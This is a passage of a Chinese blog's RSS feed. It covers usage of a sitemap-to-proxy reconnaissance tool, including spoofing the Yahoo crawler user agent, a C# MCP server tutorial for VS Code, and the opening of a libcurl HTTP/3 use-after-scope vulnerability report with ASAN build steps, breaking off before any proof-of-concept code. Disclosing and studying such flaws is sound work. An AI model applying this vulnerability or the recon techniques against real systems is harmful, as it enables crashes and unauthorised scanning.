&lt;/div&gt;&lt;p&gt;相同操作但伪装为Yahoo Bot：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./sitemap2proxy.rb --url http://www.google.com/sitemap.xml &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    --proxy http://localhost:8080 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    --ua &lt;span class=&#34;s2&#34;&gt;&amp;#34;Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;解析已下载文件并通过其他机器上的代理：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./sitemap2proxy.rb --file sitemap.xml.gz --proxy http://proxyserver.int:8080
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;带详细输出：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./sitemap2proxy.rb -v --file sitemap.xml.gz --proxy http://proxyserver.int:8080
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;查看帮助：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./sitemap2proxy.rb --help
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;有趣发现&#34;&gt;有趣发现
&lt;/h2&gt;&lt;p&gt;测试中发现google.com的robots.txt文件指定了多个附加sitemap。检查robots.txt文件总能发现有趣内容，这个发现使其更有价值。&lt;/p&gt;
&lt;h2 id=&#34;下载&#34;&gt;下载
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e4%b8%8b%e8%bd%bd%e9%93%be%e6%8e%a5&#34; &gt;版本1.1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e4%b8%8b%e8%bd%bd%e9%93%be%e6%8e%a5&#34; &gt;版本1.0&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;更新日志&#34;&gt;更新日志
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;版本1.1 - 添加响应代码统计&lt;/li&gt;
&lt;li&gt;版本1 - 初始发布&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>使用C#构建MCP服务器并在VS Code中运行AI代理</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8c%23%E6%9E%84%E5%BB%BAmcp%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E5%9C%A8vs-code%E4%B8%AD%E8%BF%90%E8%A1%8Cai%E4%BB%A3%E7%90%86/</link>
        <pubDate>Mon, 04 Aug 2025 00:53:25 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8c%23%E6%9E%84%E5%BB%BAmcp%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E5%9C%A8vs-code%E4%B8%AD%E8%BF%90%E8%A1%8Cai%E4%BB%A3%E7%90%86/</guid>
        <description>&lt;img src="https://i.imgs.ovh/2025/08/04/JhGjb.jpeg" alt="Featured image of post 使用C#构建MCP服务器并在VS Code中运行AI代理" /&gt;&lt;h1 id=&#34;构建基于mcp协议的ai代理&#34;&gt;构建基于MCP协议的AI代理
&lt;/h1&gt;&lt;p&gt;大型语言模型（如GPT-4o、Claude或Gemini）在处理通用问题时表现优异，但往往难以应对特定领域查询（例如&amp;quot;仅显示戴尔设备信息&amp;quot;）。这是因为它们缺乏访问专有/内部数据的渠道。Model Context Protocol（MCP）通过提供上下文数据解决了这一痛点。&lt;/p&gt;
&lt;h2 id=&#34;核心组件&#34;&gt;核心组件
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;MCP Host&lt;/strong&gt;：支持MCP的IDE（如VS Code）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;MCP Server&lt;/strong&gt;：托管工具并通过MCP协议暴露上下文数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;MCP Client&lt;/strong&gt;：连接Host与Server的桥梁&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;实现步骤&#34;&gt;实现步骤
&lt;/h2&gt;&lt;h3 id=&#34;1-创建mcp服务器项目&#34;&gt;1. 创建MCP服务器项目
&lt;/h3&gt;&lt;p&gt;使用C# SDK构建自定义服务器，关键代码如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;builder&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WebApplication&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateBuilder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;builder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Services&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AddMcpServer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WithStdioServerTransport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WithToolsFromAssembly&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WriteLine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;$&amp;#34;Error: {ex.Message}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;AddMcpServer()&lt;/code&gt;方法将项目转换为MCP服务器，&lt;code&gt;WithToolsFromAssembly()&lt;/code&gt;自动扫描并注册工具。&lt;/p&gt;
&lt;h3 id=&#34;2-开发mcp工具&#34;&gt;2. 开发MCP工具
&lt;/h3&gt;&lt;p&gt;工具元数据（标题和描述）帮助LLM进行语义匹配。示例工具代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;[McpServerToolType]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;BYODTool&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;    [McpServerTool(Description = &amp;#34;获取外设信息&amp;#34;)]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;GetPeripherals&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// 实现API调用逻辑&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;JsonConvert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SerializeObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;responseData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;3-配置vs-code工作区&#34;&gt;3. 配置VS Code工作区
&lt;/h3&gt;&lt;p&gt;在.vscode目录创建mcp.json配置文件：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;#34;servers&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nt&#34;&gt;&amp;#34;my-mcp-server&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nt&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;stdio&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nt&#34;&gt;&amp;#34;command&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;dotnet&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nt&#34;&gt;&amp;#34;args&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;run&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;--project&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/path/to/project.csproj&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;4-运行流程&#34;&gt;4. 运行流程
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;MCP客户端通过VS Code连接服务器&lt;/li&gt;
&lt;li&gt;用户在Copilot聊天窗口输入提示（如&amp;quot;仅显示戴尔设备&amp;quot;）&lt;/li&gt;
&lt;li&gt;LLM根据工具描述选择执行&lt;code&gt;GetPeripherals&lt;/code&gt;工具&lt;/li&gt;
&lt;li&gt;工具从安全API获取数据后，LLM生成最终响应&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;架构优势&#34;&gt;架构优势
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;模块化设计&lt;/strong&gt;：工具可独立开发和部署&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;上下文感知&lt;/strong&gt;：动态获取实时数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;安全通信&lt;/strong&gt;：支持Bearer Token认证&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;跨平台支持&lt;/strong&gt;：基于标准stdio通信&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;该方案显著提升了AI代理处理领域特定任务的能力，同时保持了系统的可扩展性和可维护性。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;图示说明：MCP架构实现了从用户提示→工具选择→数据获取→响应生成的全自动闭环流程。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>libcurl HTTP/3 POST请求处理中的栈释放后使用漏洞分析</title>
        <link>http://localhost:1313/p/libcurl-http/3-post%E8%AF%B7%E6%B1%82%E5%A4%84%E7%90%86%E4%B8%AD%E7%9A%84%E6%A0%88%E9%87%8A%E6%94%BE%E5%90%8E%E4%BD%BF%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Mon, 04 Aug 2025 00:21:29 +0800</pubDate>
        
        <guid>http://localhost:1313/p/libcurl-http/3-post%E8%AF%B7%E6%B1%82%E5%A4%84%E7%90%86%E4%B8%AD%E7%9A%84%E6%A0%88%E9%87%8A%E6%94%BE%E5%90%8E%E4%BD%BF%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;stack-use-after-scope-in-http3-post-request-processing-via-curlopt_postfields&#34;&gt;Stack use-after-scope in HTTP/3 POST request processing via CURLOPT_POSTFIELDS
&lt;/h1&gt;&lt;h2 id=&#34;摘要&#34;&gt;摘要
&lt;/h2&gt;&lt;p&gt;libcurl的HTTP/3请求处理在使用CURLOPT_POSTFIELDS与栈分配缓冲区时存在栈释放后使用漏洞。libcurl保留了用户提供的POST数据指针，但在原始栈帧销毁后仍访问该指针，导致内存损坏和潜在拒绝服务。&lt;/p&gt;
&lt;h2 id=&#34;漏洞详情&#34;&gt;漏洞详情
&lt;/h2&gt;&lt;p&gt;该漏洞发生在transfer.c:569的Curl_pretransfer()中，当libcurl对先前存储的POST数据指针（现在指向无效栈内存）调用strlen()时触发。&lt;/p&gt;
&lt;h2 id=&#34;复现步骤概念验证&#34;&gt;复现步骤/概念验证
&lt;/h2&gt;&lt;h3 id=&#34;环境&#34;&gt;环境
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;libcurl版本: 8.16.0-DEV (master分支)&lt;/li&gt;
&lt;li&gt;编译器: Clang 20.1.8 with AddressSanitizer&lt;/li&gt;
&lt;li&gt;平台: macOS (ARM64)&lt;/li&gt;
&lt;li&gt;配置: 启用HTTP/3 (ngtcp2/nghttp3)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;复现步骤&#34;&gt;复现步骤
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;使用ASAN构建libcurl:&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;CC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;clang
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;CFLAGS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-O1 -g -fsanitize=address,undefined&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./configure --with-openssl --with-nghttp2 --with-nghttp3 --with-ngtcp2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;编译POC代码:&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
